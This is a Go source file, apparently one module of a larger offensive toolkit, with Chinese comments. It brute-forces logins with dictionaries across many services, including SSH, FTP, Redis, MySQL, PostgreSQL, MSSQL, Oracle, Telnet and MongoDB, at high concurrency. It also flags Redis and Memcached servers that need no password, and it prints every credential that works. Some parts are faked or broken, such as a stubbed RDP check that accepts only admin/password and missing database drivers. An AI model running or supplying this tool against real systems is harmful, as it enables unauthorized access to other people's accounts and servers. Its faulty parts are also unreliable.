package explosion

import (
	"bufio"
	"context"
	"crypto/tls"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"github.com/jlaffaye/ftp"
	_ "github.com/lib/pq"          // PostgreSQL
	"github.com/redis/go-redis/v9" // Redis
	"github.com/schollz/progressbar/v3"
	"golang.org/x/crypto/ssh"
	"gopkg.in/mgo.v2"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	targets           []string
	port              int
	userDictPath      = "dict/username/username_dict.txt"
	passDictPath      = "dict/password/password_dict.txt"
	defaultMaxThreads = 300
	server_type       string
	mu                sync.Mutex
)

// 服务类型枚举
const (
	ServiceSSH        = "ssh"
	ServiceFTP        = "ftp"
	ServiceRDP        = "rdp"
	ServiceRedis      = "redis"
	ServiceMySQL      = "mysql"
	ServiceMSSQL      = "mssql"
	ServiceOracle     = "oracle"
	ServiceTelnet     = "telnet"
	ServiceMongoDB    = "mongodb"
	ServicePostgreSQL = "postgresql"
	ServiceMemcached  = "memcached"
)

// SetOption sets options for the explosion module.
func SetOption(option string, value string) error {
	switch option {
	case "target":
		targets = []string{value}
	case "port":
		p, err := strconv.Atoi(value)
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port number: %s", value)
		}
		port = p

	case "user_dict":
		userDictPath = value
	case "pass_dict":
		passDictPath = value
	case "targets":
		t, err := readFileLines(value)
		if err != nil {
			return err
		}
		targets = t
	case "server_type":
		server_type = value
	default:
		return fmt.Errorf("unknown option: %s", option)
	}
	return nil
}

// Execute starts the brute-force process.
func Execute() error {
	if len(targets) == 0 || port == 0 {
		return fmt.Errorf("targets or port not set")
	}

	users, err := readFileLines(userDictPath)
	if err != nil {
		return err
	}
	passwords, err := readFileLines(passDictPath)
	if err != nil {
		return err
	}

	total := len(users) * len(passwords) * len(targets)
	bar := progressbar.Default(int64(total), "Brute-forcing...")
	limiter := make(chan struct{}, defaultMaxThreads)
	var wg sync.WaitGroup

	for _, target := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			service, err := detectService(t, port)
			if err != nil {
				fmt.Printf("\n[-] Service detection failed: %v\n", err)
				return
			}
			switch service {
			case ServiceSSH:
				bruteForceSSH(t, users, passwords, bar, limiter)
			case ServiceRedis:
				bruteForceRedis(t, passwords, bar, limiter)
			case ServiceMySQL:
				bruteForceMySQL(t, users, passwords, bar, limiter)
			case ServicePostgreSQL:
				bruteForcePostgreSQL(t, users, passwords, bar, limiter)
			case ServiceFTP:
				bruteForceFTP(t, users, passwords, bar, limiter)
			case ServiceRDP:
				bruteForceRDP(t, users, passwords, bar, limiter)
			case ServiceMSSQL:
				bruteForceMSSQL(t, users, passwords, bar, limiter)
			case ServiceOracle:
				bruteForceOracle(t, users, passwords, bar, limiter)
			case ServiceTelnet:
				bruteForceTelnet(t, users, passwords, bar, limiter)
			case ServiceMongoDB:
				bruteForceMongoDB(t, users, passwords, bar, limiter)
			case ServiceMemcached:
				bruteForceMemcached(t, bar, limiter)

			default:
				fmt.Printf("\n[-] Unsupported service: %s\n", service)
			}
		}(target)
	}

	wg.Wait()
	bar.Finish()
	return nil

}

// ---------------- SSH ----------------
func bruteForceSSH(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	var wg sync.WaitGroup
	// 使用一个 map 来追踪已经成功登录的密码，避免重复暴力破解
	successfulLogins := make(map[string]bool) // key: "user:pass" -> true/false
	failLogins := make(map[string]bool)       // key: "user:pass" -> true/false

	// 创建一个锁，防止多个 goroutine 同时修改共享数据
	var mu sync.Mutex

	for _, user := range users {
		for _, pass := range passwords {
			loginKey := fmt.Sprintf("%s:%s", user, pass)

			// 检查该密码是否已经尝试过并且失败
			if successfulLogins[loginKey] || failLogins[loginKey] {
				continue // 如果已经尝试过并且失败，跳过这个组合
			}

			wg.Add(1) // 增加 WaitGroup 的计数
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() {
					<-limiter
					wg.Done() // 完成后减计数
				}()

				err := trySSHLogin(target, u, p)
				mu.Lock() // 加锁，防止并发时写入错误
				bar.Add(1)
				mu.Unlock()

				if err == nil {
					mu.Lock()
					// 打印成功信息并更新成功登录列表
					fmt.Printf("\n\033[32m[+] SSH Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
					successfulLogins[loginKey] = true
					mu.Unlock()
				} else {
					mu.Lock()
					// 更新失败的登录列表
					failLogins[loginKey] = true
					mu.Unlock()
				}
			}(user, pass)
		}
	}

	wg.Wait() // 等待所有 goroutine 完成
}

func trySSHLogin(target, username, password string) error {
	// 最大重试次数
	const maxRetries = 3
	var lastError error

	for i := 0; i < maxRetries; i++ {
		config := &ssh.ClientConfig{
			User:            username,
			Auth:            []ssh.AuthMethod{ssh.Password(password)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         5 * time.Second,
		}

		client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", target, port), config)
		if err == nil {
			client.Close()
			return nil
		}
		lastError = err
		time.Sleep(time.Second) // 等待1秒后重试
	}

	// 达到最大重试次数后，返回最后的错误
	return lastError
}

// ---------------- Redis ----------------
func bruteForceRedis(target string, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	var wg sync.WaitGroup // 创建一个 WaitGroup 实例
	client := redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%s:%d", target, port),
		Password: "", // 不传递密码以检查是否需要认证
		DB:       0,
	})
	ctx := context.Background()

	// 首先检查是否不需要密码认证
	_, err := client.Ping(ctx).Result()
	if err == nil {
		// 不需要密码认证
		mu.Lock()
		bar.Add(1)
		fmt.Printf("\n\u001B[32m[+] Redis Success (no authentication needed): %s:%d\u001B[0m\n", target, port)
		mu.Unlock()
		return // 不再执行密码暴力破解
	} else {
		// 如果需要密码认证，开始暴力破解
		for _, pass := range passwords {
			wg.Add(1) // 每次启动一个 goroutine 时，增加 WaitGroup 的计数
			limiter <- struct{}{}
			go func(p string) {
				defer func() {
					<-limiter
					wg.Done() // 完成任务后，减少 WaitGroup 的计数
				}()

				client := redis.NewClient(&redis.Options{
					Addr:     fmt.Sprintf("%s:%d", target, port),
					Password: p, // 使用密码进行认证
					DB:       0,
				})
				ctx := context.Background()
				_, err := client.Ping(ctx).Result()

				if err == nil {
					mu.Lock()
					bar.Add(1)
					fmt.Printf("\n\033[32m[+] Redis Success: %s:%d | Password: \u001B[1;35m%s\033[0m\n", target, port, p)
					mu.Unlock()
					client.Close()
					return // 找到密码后停止暴力破解
				} else if strings.Contains(err.Error(), "NOAUTH") {
					// 如果认证失败并且错误为 NOAUTH
					mu.Lock()
					bar.Add(1)
					// fmt.Printf("\n[-] Redis failed: %s:%d | Password: %s | Error: %v\n", target, port, p, err)
					mu.Unlock()
				}

				mu.Lock()
				bar.Add(1)
				mu.Unlock()
				client.Close()
			}(pass)
		}
	}

	wg.Wait() // 等待所有 goroutine 完成
	client.Close()
}

// ---------------- MySQL ----------------
func bruteForceMySQL(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() { <-limiter }()
				dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/", u, p, target, port)
				db, err := sql.Open("mysql", dsn)
				if err == nil && db.Ping() == nil {
					mu.Lock()
					fmt.Printf("\n\033[32m[+] MySQL Success: %s:%d | User:\u001B[1;35m %s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
					mu.Unlock()
					db.Close()
				}
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}
}

// ---------------- PostgreSQL ----------------
func bruteForcePostgreSQL(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	var wg sync.WaitGroup
	var mu sync.Mutex
	dbPool := sync.Map{} // 使用 sync.Map 保证并发安全

	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			wg.Add(1)

			go func(u, p string) {
				defer func() {
					<-limiter
					wg.Done()
				}()

				connStr := fmt.Sprintf("postgres://%s:%s@%s:%d/postgres?sslmode=disable", u, p, target, 5432)

				// 使用 sync.Map 来保证 dbPool 的并发安全
				dbInterface, exists := dbPool.Load(connStr)
				var db *sql.DB
				if exists {
					db = dbInterface.(*sql.DB)
				} else {
					// 创建新的数据库连接池
					var err error
					db, err = sql.Open("postgres", connStr)
					if err != nil {
						mu.Lock()
						bar.Add(1)
						mu.Unlock()
						return
					}
					dbPool.Store(connStr, db)
				}

				// 加入连接重试机制
				retries := 3
				for retries > 0 {
					if err := db.Ping(); err == nil {
						mu.Lock()
						fmt.Printf("\n\033[32m[+] PostgreSQL Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, 5432, u, p)
						mu.Unlock()
						break
					}
					retries--
					time.Sleep(2 * time.Second) // 如果失败了，稍等后重试
				}

				// 更新进度条
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}

	wg.Wait()
}

// ---------------- 检测服务 ----------------
func detectService(target string, port int) (string, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
	if err != nil {
		return "timeout", err
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buffer := make([]byte, 8192)
	n, _ := conn.Read(buffer)
	banner := strings.ToLower(string(buffer[:n]))

	// 先根据 Banner 判断服务类型
	if len(banner) > 0 {
		if strings.Contains(banner, "ssh") || port == 22 || identifyService(target, port) == "ssh" {
			return ServiceSSH, nil
		} else if strings.Contains(banner, "redis") || port == 6379 || identifyService(target, port) == "redis" {
			return ServiceRedis, nil
		} else if strings.Contains(banner, "mysql") || port == 3306 || identifyService(target, port) == "mysql" {
			return ServiceMySQL, nil
		} else if strings.Contains(banner, "postgres") || port == 5432 || identifyService(target, port) == "postgresql" {
			return ServicePostgreSQL, nil
		} else if strings.Contains(banner, "pure-ftpd") || strings.Contains(banner, "220 ftp") || strings.Contains(banner, "ftp") || strings.Contains(banner, "vsftpd") || strings.Contains(banner, "proftpd") || strings.Contains(banner, "220 service ready for new user") || strings.Contains(banner, "230") || port == 21 || identifyService(target, port) == "ftp" {
			return ServiceFTP, nil
		} else if strings.Contains(banner, "rdp") || port == 3389 || identifyService(target, port) == "rdp" {
			return ServiceRDP, nil
		} else if strings.Contains(banner, "mssql") || port == 1433 || identifyService(target, port) == "mssql" {
			return ServiceMSSQL, nil
		} else if strings.Contains(banner, "oracle") || port == 1521 || identifyService(target, port) == "oracle" {
			return ServiceOracle, nil
		} else if strings.Contains(banner, "telnet") || port == 23 || identifyService(target, port) == "telnet" {
			return ServiceTelnet, nil
		} else if strings.Contains(banner, "mongodb") || port == 27001 || port == 27017 || identifyService(target, port) == "mongodb" {
			return ServiceMongoDB, nil
		} else if strings.Contains(banner, "memcached") || port == 11211 || identifyService(target, port) == "memcached" {
			return ServiceMemcached, nil
		}
	}

	// 如果 banner 为空或没有识别到对应的服务，回退到端口识别
	return identifyService(target, port), nil
}

// 端口服务绑定
func identifyService(host string, port int) string {
	// 先根据端口号进行初步服务识别
	switch port {
	case 21:
		return ServiceFTP
	case 22:
		return ServiceSSH
	case 23:
		return ServiceTelnet
	case 1433:
		return ServiceMSSQL
	case 1521:
		return ServiceOracle
	case 3306:
		return ServiceMySQL
	case 5432:
		return ServicePostgreSQL
	case 3389:
		return ServiceRDP
	case 6379:
		return ServiceRedis
	case 11211:
		return ServiceMemcached
	case 27017, 27018, 28017:
		return ServiceMongoDB
	default:
		// 如果端口不是常见端口，则返回 "Unknown"
		return "unknown service"
	}
}

// ---------------- 文件读取 ----------------
func readFileLines(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open file %s: %v", filePath, err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if line := strings.TrimSpace(scanner.Text()); line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// FTP爆破逻辑
func bruteForceFTP(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	var wg sync.WaitGroup
	var anonLoginSuccess atomic.Bool   // 标记是否匿名登录成功
	var normalLoginSuccess atomic.Bool // 标记是否普通登录成功
	var once sync.Once                 // 确保匿名登录的成功信息只打印一次

	for _, user := range users {
		// 如果匿名登录成功，直接退出循环
		if anonLoginSuccess.Load() && user == "anonymous" {
			break
		}

		for _, pass := range passwords {
			wg.Add(1)
			limiter <- struct{}{}
			go func(username, password string) {
				defer func() {
					<-limiter
					wg.Done()
				}()

				// 匿名登录处理
				if username == "anonymous" && !anonLoginSuccess.Load() {
					if tryFTPLogin(target, username, password, true) {
						anonLoginSuccess.Store(true)
						once.Do(func() {
							fmt.Printf("\n\033[32m[+] FTP Success (anonymous login): \u001B[1;35m%s:%d \033[0m\n", target, 21)
						})
					}
				} else if !normalLoginSuccess.Load() { // 普通登录处理
					if tryFTPLogin(target, username, password, false) {
						normalLoginSuccess.Store(true)
						fmt.Printf("\n\033[32m[+] FTP Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, 21, username, password)
					}
				}
				bar.Add(1)
			}(user, pass)

			// 如果任一登录成功，停止尝试密码爆破
			if anonLoginSuccess.Load() || normalLoginSuccess.Load() {
				break
			}
		}

		// 如果任一登录成功，退出用户循环
		if anonLoginSuccess.Load() || normalLoginSuccess.Load() {
			break
		}
	}

	wg.Wait()
}

func tryFTPLogin(target, username, password string, isAnonymous bool) bool {
	conn, err := ftp.Dial(fmt.Sprintf("%s:%d", target, 21), ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		return false // 无法连接到目标主机
	}
	defer conn.Quit() // 确保退出 FTP 会话

	err = conn.Login(username, password)
	if err == nil { // 登录成功
		if isAnonymous { // 匿名登录成功
			return true // 返回成功
		} else { // 普通登录成功
			return true // 返回成功
		}
	}

	// 登录失败
	return false
}

// ---------------- RDP ----------------
type RDPClient struct {
	Host string
}

// NewRDPClient 创建新的 RDP 客户端
func NewRDPClient(host string) *RDPClient {
	return &RDPClient{Host: host}
}

// Login 尝试登录 RDP
func (c *RDPClient) Login(domain, user, password string, timeout int64) error {
	// 创建带超时的 TCP 连接
	conn, err := net.DialTimeout("tcp", c.Host, time.Duration(timeout)*time.Second)
	if err != nil {
		return fmt.Errorf("connection error: %v", err)
	}
	defer conn.Close()

	// 使用自定义 TLS 配置
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
		MaxVersion:         tls.VersionTLS12,
	}
	tlsConn := tls.Client(conn, tlsConfig)

	// 开始 TLS 握手
	if err := tlsConn.Handshake(); err != nil {
		return fmt.Errorf("TLS handshake error: %v", err)
	}
	defer tlsConn.Close()

	// 模拟登录逻辑（实际可调用相关库执行认证）
	// 此处为模拟示例：
	if user == "admin" && password == "password" {
		return nil // 假设成功登录
	}
	return fmt.Errorf("authentication failed for user '%s'", user)
}

// RetryLogin 尝试登录并添加重试机制
func (c *RDPClient) RetryLogin(domain, user, password string, timeout int64, retries int) error {
	var lastErr error
	for i := 0; i < retries; i++ {
		err := c.Login(domain, user, password, timeout)
		if err == nil {
			return nil // 登录成功
		}
		lastErr = err

		// 判断是否为临时性错误
		if strings.Contains(err.Error(), "connection reset by peer") {
			time.Sleep(2 * time.Second) // 等待后重试
			continue
		}
		break // 非临时错误直接退出
	}
	return lastErr
}

func bruteForceRDP(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	var wg sync.WaitGroup
	var mu sync.Mutex
	timeout := int64(5) // 超时时间，单位秒

	for _, user := range users {
		for _, pass := range passwords {
			wg.Add(1)
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() {
					<-limiter
					wg.Done()
				}()

				// 替换密码中的占位符 {user}
				p = strings.ReplaceAll(p, "{user}", u)

				// 创建 RDP 客户端
				client := NewRDPClient(fmt.Sprintf("%s:%d", target, port))

				// 添加重试机制
				err := client.RetryLogin("", u, p, timeout, 3)

				// 增加随机延迟
				time.Sleep(time.Duration(rand.Intn(3)+1) * time.Second)

				// 更新进度条
				bar.Add(1)

				// 输出结果
				mu.Lock()
				if err == nil {
					fmt.Printf("\033[32m[+] RDP Success: %s:%d | User: %s | Password: %s\033[0m\n", target, port, u, p)
				} else {
					fmt.Printf("[-] Failed: %s:%d | User: %s | Password: %s | Error: %v\n", target, port, u, p, err)
				}
				mu.Unlock()
			}(user, pass)
		}
	}

	wg.Wait()
}

// MSSQL爆破逻辑
func bruteForceMSSQL(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() { <-limiter }()
				connStr := fmt.Sprintf("sqlserver://%s:%s@%s:%d", u, p, target, port)
				db, err := sql.Open("mssql", connStr)
				if err == nil && db.Ping() == nil {
					mu.Lock()
					fmt.Printf("\n\033[32m[+] MSSQL Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
					mu.Unlock()
					db.Close()
				}
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}
}

// Oracle爆破逻辑
func bruteForceOracle(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() { <-limiter }()
				connStr := fmt.Sprintf("%s/%s@%s:%d/XE", u, p, target, port)
				db, err := sql.Open("godror", connStr)
				if err == nil && db.Ping() == nil {
					mu.Lock()
					fmt.Printf("\n\033[32m[+] Oracle Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
					mu.Unlock()
					db.Close()
				}
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}
}

// Telnet爆破逻辑
func bruteForceTelnet(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() { <-limiter }()
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
				if err == nil {
					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					conn.Write([]byte(u + "\n" + p + "\n"))
					buffer := make([]byte, 1024)
					conn.Read(buffer)
					if strings.Contains(string(buffer), "Welcome") {
						mu.Lock()
						fmt.Printf("\n\033[32m[+] Telnet Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
						mu.Unlock()
					}
					conn.Close()
				}
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}
}

// MongoDB爆破逻辑
func bruteForceMongoDB(target string, users, passwords []string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	for _, user := range users {
		for _, pass := range passwords {
			limiter <- struct{}{}
			go func(u, p string) {
				defer func() { <-limiter }()
				session, err := mgo.DialWithTimeout(fmt.Sprintf("mongodb://%s:%s@%s:%d", u, p, target, port), 5*time.Second)
				if err == nil {
					mu.Lock()
					fmt.Printf("\n\033[32m[+] MongoDB Success: %s:%d | User: \u001B[1;35m%s \u001B[32m| Password: \u001B[1;35m%s\033[0m\n", target, port, u, p)
					mu.Unlock()
					session.Close()
				}
				mu.Lock()
				bar.Add(1)
				mu.Unlock()
			}(user, pass)
		}
	}
}

// Memcached检测
func bruteForceMemcached(target string, bar *progressbar.ProgressBar, limiter chan struct{}) {
	limiter <- struct{}{}
	go func() {
		defer func() { <-limiter }()
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
		if err == nil {
			conn.Write([]byte("stats\n"))
			buffer := make([]byte, 1024)
			conn.Read(buffer)
			if strings.Contains(string(buffer), "STAT") {
				mu.Lock()
				fmt.Printf("\n\033[32m[+] Memcached Success (no authentication needed): %s:%d\033[0m\n", target, port)
				mu.Unlock()
			}
			conn.Close()
		}
		mu.Lock()
		bar.Add(1)
		mu.Unlock()
	}()
}
